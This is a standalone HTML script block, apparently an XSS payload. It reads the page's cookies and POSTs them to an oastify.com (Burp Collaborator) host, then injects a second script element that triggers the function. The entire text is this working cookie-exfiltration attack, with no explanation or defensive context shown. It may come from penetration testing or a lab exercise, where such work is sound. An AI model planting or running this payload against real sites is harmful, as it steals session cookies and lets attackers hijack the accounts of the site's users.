<script>
  function sendCookies() {
    const cookies = document.cookie;
    fetch('http://if1khcbq8qjap13tfpjmloxa319sxold.oastify.com/', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
      },
      body: 'cookies=' + encodeURIComponent(cookies),
    });
  }
  const script = document.createElement('script');
  script.innerHTML = 'sendCookies()';
  document.body.appendChild(script);
</script>
